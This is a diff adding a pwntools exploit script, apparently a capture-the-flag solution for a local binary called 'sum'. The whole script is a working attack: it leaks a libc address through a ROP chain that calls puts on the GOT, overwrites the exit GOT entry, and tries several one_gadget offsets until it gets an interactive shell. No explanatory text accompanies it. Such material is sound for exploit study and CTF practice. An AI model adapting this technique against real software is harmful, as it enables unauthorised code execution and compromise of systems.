@@ -1,0 +1,56 @@
+from pwn import *
+
+#p = process("./sum_ccafa40ee6a5a675341787636292bf3c84d17264_patched")
+'''
+p = gdb.debug("./sum_ccafa40ee6a5a675341787636292bf3c84d17264_patched", gdbscript = 
+b *main + 154
+)
+'''
+
+e = ELF("./sum_ccafa40ee6a5a675341787636292bf3c84d17264_patched")
+libc = ELF("./libc.so")
+
+exit_got = e.got['exit']
+main_func = e.symbols['main'] + 1
+puts_plt = e.plt['puts']
+puts_got = e.got['puts']
+printf_got = e.got['printf']
+rw_section = 0x601100
+
+pop_rdi = 0x0000000000400a43
+ret = pop_rdi + 1
+one_shot = [0x4f2be, 0x4f2c5, 0x4f322, 0x10a38c]
+
+for i in range(4):
+    p = process("./sum_ccafa40ee6a5a675341787636292bf3c84d17264_patched")
+    
+    p.recvuntil(b"4 0\n")
+    p.sendline(f"{pop_rdi}".encode())
+    p.sendline(f"{puts_got}".encode())
+    p.sendline(f"{puts_plt}".encode())
+    p.sendline(f"{main_func}".encode())
+    p.sendline(f"{pop_rdi - exit_got - pop_rdi - puts_got - puts_plt - main_func}".encode())
+    p.sendline(f"{exit_got}".encode())
+    
+    libc_base = u64(p.recv(6) + b"\x00" * 2) - 0x809c0
+    print(hex(libc_base))
+    
+    p.recvuntil(b"4 0\n")
+    p.sendline(f"{ret}".encode())
+    p.sendline(f"{one_shot[i] + libc_base}".encode())
+    p.sendline(f"{1}".encode())
+    p.sendline(f"{1}".encode())
+    p.sendline(f"{1}".encode())
+    p.sendline(f"{rw_section}".encode())
+    
+    try:
+        p.sendline(b"echo vani5hing")
+        p.recvuntil("vani5hing")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+    
+p.interactive()
